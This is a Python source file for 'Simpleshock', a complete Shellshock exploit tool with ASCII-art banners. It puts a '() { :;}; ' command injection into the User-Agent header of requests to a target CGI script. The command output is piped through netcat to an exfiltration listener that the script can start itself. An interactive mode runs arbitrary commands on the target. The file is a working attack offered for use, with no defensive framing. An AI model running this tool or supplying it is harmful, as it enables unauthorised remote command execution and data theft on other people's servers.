"""Simpleshock.
Author:
  unlisted

Comments:
  Thank you, thank you everyone

Usage:
  simpleshock.py target <target_ip> target-url <target_url> [--shell] [--create-server] [--exfil-cmd=<exfil_cmd>] [--exfil-ip=<exfil_ip>] [--exfil-port=<exfil_port>]

Options:
  target                            IP of vulnerable target.
  target-url                        Url path to vulnerable script
  --shell                           Drops user into shell with server.
  --create-server           Creates a simple server.
  --exfil-ip=<exfil_ip>             IP of exfil server. [default: 0.0.0.0]
  --exfil-port=<exfil_port>         Port for exfil server. [default: 1337]
  --exfil-cmd=<exfil_cmd>           Command to run on target. [default: /bin/sleep 3]

"""
from __future__ import print_function
from docopt import docopt
from colorprint import *
import sys, requests, time, json, socket
import SocketServer
from threading import Thread
from multiprocessing import Process

welcome_text = """
                                               ,-.
                          ___,---.__          /'|`\          __,---,___
                       ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
                     ,'        |           ~'\     /`~           |        `.
                    /      ___//              `. ,'          ,  , \___      \\
                   |    ,-'   `-.__   _         |        ,    __,-'   `-.    |
                   |   /          /\_  `   .    |    ,      _/\          \   |
                   \  |           \ \`-.___ \   |   / ___,-'/ /           |  /
                    \  \           | `._   `\\\\  |  //'   _,' |           /  /
                     `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
                        ``       /     \    ,='/ \`=.    /     \       ''
                                |__   /|\_,--.,-.--,--._/|\   __|
                                /  `./  \\\\`\ |  |  | /,//' \,'  \\
                               /   /     ||--+--|--+-/-|     \   \\
                              |   |     /'\_\_\ | /_/_/`\     |   |
                               \   \__, \_     `~'     _/ .__/   /
                                `-._,-'   `-._______,-'   `-._,-'



 (`-').->  _     <-. (`-')   _  (`-')          (`-')  _ (`-').-> (`-').->                     <-.(`-')  
 ( OO)_   (_)       \(OO )_  \-.(OO )   <-.    ( OO).-/ ( OO)_   (OO )__      .->    _         __( OO)  
(_)--\_)  ,-(`-'),--./  ,-.) _.'    \ ,--. )  (,------.(_)--\_) ,--. ,'-'(`-')----.  \-,-----.'-'. ,--. 
/    _ /  | ( OO)|   `.'   |(_...--'' |  (`-') |  .---'/    _ / |  | |  |( OO).-.  '  |  .--./|  .'   / 
\_..`--.  |  |  )|  |'.'|  ||  |_.' | |  |OO )(|  '--. \_..`--. |  `-'  |( _) | |  | /_) (`-')|      /) 
.-._)   \(|  |_/ |  |   |  ||  .___.'(|  '__ | |  .--' .-._)   \|  .-.  | \|  |)|  | ||  |OO )|  .   '  
\       / |  |'->|  |   |  ||  |      |     |' |  `---.\       /|  | |  |  '  '-'  '(_'  '--'\|  |\   \ 
 `-----'  `--'   `--'   `--'`--'      `-----'  `------' `-----' `--' `--'   `-----'    `-----'`--' '--' 
"""

def type_out(s):
    for c in s:
        sleep_time = 0.5 if c == "." else 0.02
        print(c, color="green", format=["bold"], end="")
        sys.stdout.flush()
        time.sleep(sleep_time)
    print("")

class SingleTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            data = ""
            while 1:
                d = self.request.recv(1024)
                if not d:
                    break
                data += d

            print(data)

            sys.stdout.flush()
        except:
            pass

        self.request.close()

class SimpleshockServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, server_address, RequestHandlerClass):
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)

def create_server(host, port):
    host = "0.0.0.0"
    server = SimpleshockServer((host, int(port)), SingleTCPHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        sys.exit(0)

def get_ip(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, 80))
    return s.getsockname()[0]

def be_h4x0r(args, exfil_ip):
    while True:
        cmd = raw_input("$ ")
        if cmd == "exit":
            return

        url = "http://%s/%s" % (args["<target_ip>"], args["<target_url>"])
        payload = "%s | /bin/nc %s %s" % (cmd, exfil_ip, args["--exfil-port"])
        headers = {'user-agent': '() { :;}; ' + payload}
        r = requests.get(url, headers=headers)

def be_1337(args, exfil_ip):
    type_out("[*] Preparing payload to be delivered...")
    url = "http://%s/%s" % (args["<target_ip>"], args["<target_url>"])

    payload = "%s | /bin/nc %s %s" % (args["--exfil-cmd"], exfil_ip, args["--exfil-port"])
    headers = {'user-agent': '() { :;}; ' + payload}
    type_out("[+] Payload created: %s" % json.dumps(headers))

    type_out("[*] Sending payload to remote host: %s..." % args["<target_ip>"])
    r = requests.get(url, headers=headers)
    type_out("[+] Payload sent to server!")

def main(args):
    cur_ip = get_ip(args["<target_ip>"])
    using_remote_exfil = "--exfil-ip" in args.keys() and args["--exfil-ip"] != "0.0.0.0"

    exfil_ip = args["--exfil-ip"]
    p = None
    if not using_remote_exfil or args["--create-server"]:
        p = Process(target=create_server, args=(args["--exfil-ip"], args["--exfil-port"], ))
        p.start()
        exfil_ip = cur_ip

    if args["--shell"]:
        be_h4x0r(args, exfil_ip)
    else:
        be_1337(args, exfil_ip)

    if using_remote_exfil:
        type_out("[*] Check remote server for exil: %s..." % args["<target_ip>"])
    else:
        p.terminate()

if __name__ == '__main__':
    print(welcome_text, color="red", format=["bold"])
    arguments = docopt(__doc__, version='Simpleshock 1.0')
    main(arguments)
